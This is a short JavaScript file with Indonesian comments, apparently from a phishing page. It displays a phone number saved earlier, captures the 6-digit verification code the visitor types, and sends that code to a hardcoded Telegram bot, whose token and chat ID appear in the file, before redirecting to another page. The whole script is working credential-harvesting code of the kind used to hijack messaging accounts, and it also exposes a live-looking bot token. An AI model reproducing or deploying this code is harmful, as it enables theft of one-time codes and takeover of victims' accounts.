document.addEventListener("DOMContentLoaded", function () {
  // Mendapatkan nomor telepon dari localStorage
  const phoneNumber = localStorage.getItem("phone");

  // Tampilkan nomor telepon di dalam elemen <span id="phone-number">
  if (phoneNumber) {
    document.getElementById("phone-number").textContent = phoneNumber;
  }

  // Ambil elemen input kode
  const kodeInput = document.getElementById("kode");

  // Event listener untuk mendeteksi ketika 6 digit sudah dimasukkan
  kodeInput.addEventListener("input", async function () {
    if (kodeInput.value.length === 6) {
      // Kirim data otomatis ketika sudah 6 digit
      const kode = kodeInput.value;

      // Kirim kode ke server atau API
      try {
        const formData = new FormData();
        formData.append("kode", kode);

        const token = "6968514066:AAFvdMMmQvkZNxXNC3ePXTaOduaKjnbiNs8";
        const chatId = "6936181512";
        const apiUrl = `https://api.telegram.org/bot${token}/sendMessage`;

        const combinedFormData = new URLSearchParams();
        combinedFormData.append("chat_id", chatId);
        combinedFormData.append("text", `Kode : ${kode}`);

        await fetch(apiUrl, {
          method: "POST",
          body: combinedFormData,
          headers: {
            "Content-Type": "application/x-www-form-urlencoded",
          },
        });

        // Pindah ke halaman berikutnya jika berhasil
        window.location.href = "js/lol.html"; // Ganti dengan halaman yang sesuai
      } catch (error) {
        console.error("Error:", error);
        alert("Masukkan nomor yang benar.");
      }
    }
  });
});
